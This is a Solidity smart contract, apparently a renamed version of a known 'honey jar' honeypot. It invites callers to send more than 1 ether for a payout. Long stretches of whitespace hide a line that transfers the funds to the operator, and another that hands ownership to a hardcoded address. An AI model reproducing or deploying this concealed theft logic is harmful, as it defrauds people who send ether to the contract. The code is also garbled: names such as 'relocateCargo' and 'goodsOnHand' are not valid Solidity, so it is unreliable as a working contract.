pragma solidity ^0.4.19;

contract HomeyJar {
    address public FacilityOperator = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    FacilityOperator.relocateCargo(this.goodsOnHand);
            msg.sender.relocateCargo(this.goodsOnHand);
        }
    }

    function checkOutCargo() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){FacilityOperator=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == FacilityOperator);
        FacilityOperator.relocateCargo(this.goodsOnHand);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == FacilityOperator);
        adr.call.value(msg.value)(data);
    }
}